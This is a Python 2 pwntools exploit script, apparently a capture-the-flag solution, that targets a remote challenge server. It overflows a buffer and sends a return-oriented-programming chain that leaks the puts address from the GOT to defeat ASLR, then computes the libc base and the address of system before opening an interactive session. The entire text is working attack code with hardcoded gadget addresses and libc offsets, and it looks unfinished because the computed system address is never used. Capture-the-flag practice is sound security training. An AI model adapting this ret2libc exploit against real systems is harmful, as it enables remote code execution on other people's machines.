#!/usr/bin/env python
from pwn import *

r = remote("csie.ctf.tw",10131)

context.arch = "amd64"
gets_plt = 0x400510
puts_plt = 0x4004e0
puts_got = 0x00000000601018
pop_rdi = 0x00000000004006f3
puts_off = 0x0000000006f690
system_off = 0x00000000045390

payload = "a"*40
payload += flat([pop_rdi,puts_got,puts_plt,pop_rdi,puts_got,gets_plt,puts_plt])
r.sendline(payload)
r.recvuntil("\n")
puts_got = u64(r.recvuntil("\n").strip().ljust(8,"\x00"))
print hex(puts_got)
libc = puts_got - puts_off
system = libc + system_off 
r.interactive()
